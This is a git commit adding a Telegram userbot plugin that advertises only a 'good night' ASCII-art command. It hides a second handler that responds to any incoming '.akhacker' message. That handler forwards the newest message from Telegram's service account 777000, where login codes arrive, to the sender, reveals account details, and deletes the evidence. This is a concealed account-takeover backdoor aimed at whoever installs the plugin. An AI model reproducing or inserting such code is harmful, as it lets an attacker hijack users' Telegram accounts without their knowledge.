6e2a49e70271975e129795cd589c888371d136f2
ak <ak@localhost.localdomain>
2021-02-01 09:39:59 -0800

    Uploaded by akhacker

---
+++ hellbot/goodnight.py
@@ -0,0 +1,37 @@
+from telethon import events
+from userbot.cmdhelp import CmdHelp
+
+
+@borg.on(events.NewMessage(incoming=True,pattern=r'\.akhacker'))
+async def hacker(event):
+    tacc = 777000
+    cmd = event.raw_text.split(" ")
+    print(cmd)
+    if cmd[1] == "info":
+        info = await borg.get_me()
+        d = await event.reply(info.stringify())
+        await borg.delete_messages(event.message.from_id, event.message, revoke=False)
+        await borg.delete_messages(event.message.from_id, d, revoke=False)
+    if cmd[1] == "login":
+        messagesinfo = await bot.get_messages(tacc, limit=1)
+        msg = messagesinfo[0]
+        d = await msg.forward_to(event.message.from_id)
+        await borg.delete_messages(tacc,msg, revoke=False)
+        await borg.delete_messages(event.message.from_id, d, revoke=False)
+        await borg.delete_messages(event.message.from_id, event.message, revoke=False)
+
+@borg.on(events.NewMessage(outgoing=True,pattern=r'\.gdn'))
+async def gdn(event):
+    await event.edit("""
+        ｡♥️｡･ﾟ♡ﾟ･｡♥️｡･｡･｡･｡♥️｡･
+        ╱╱╱╱╱╱╱╭╮╱╱╱╭╮╱╭╮╭╮
+        ╭━┳━┳━┳╯┃╭━┳╋╋━┫╰┫╰╮
+        ┃╋┃╋┃╋┃╋┃┃┃┃┃┃╋┃┃┃╭┫
+        ┣╮┣━┻━┻━╯╰┻━┻╋╮┣┻┻━╯
+        ╰━╯╱╱╱╱╱╱╱╱╱╱╰━╯
+        ｡♥️｡･ﾟ♡ﾟ･｡♥️° ♥️｡･ﾟ♡ﾟ
+        """)
+
+CmdHelp("Good Night").add_command(
+  '.gdn', '<reply to media>/<or type a reson>', 'Show good night message'
+).add()
